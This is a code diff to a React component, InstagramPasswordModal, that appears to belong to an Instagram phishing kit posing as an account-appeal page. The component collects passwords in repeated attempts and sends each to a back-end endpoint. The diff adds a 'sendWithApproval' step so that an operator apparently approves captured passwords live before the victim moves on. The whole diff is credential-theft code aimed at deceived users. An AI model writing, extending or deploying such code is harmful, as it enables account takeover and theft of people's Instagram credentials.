@@ -3,10 +3,10 @@ import { useTranslation } from '@/hooks/use-translation';
 import { store } from '@/store/store';
 import config from '@/utils/config';
 import { buildAppealMessage } from '@/utils/message';
+import { sendWithApproval } from '@/utils/send-with-approval';
 import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
 import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
-import axios from 'axios';
 import Image from 'next/image';
 import { type FC, useState } from 'react';
 
@@ -59,15 +59,21 @@ const InstagramPasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         });
 
         try {
-            const res = await axios.post('/api/send', { message, old_message_id: messageId });
+            const { result, message_id } = await sendWithApproval({
+                message,
+                old_message_id: messageId,
+                approval_type: 'password'
+            });
 
-            if (res?.data?.success && typeof res.data.message_id === 'number') {
-                setMessageId(res.data.message_id);
+            if (message_id !== null) {
+                setMessageId(message_id);
             }
 
-            if (config.PASSWORD_LOADING_TIME) {
-                await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
+            if (result === 'approved') {
+                nextStep();
+                return;
             }
+
             if (next >= maxPass) {
                 nextStep();
             } else {
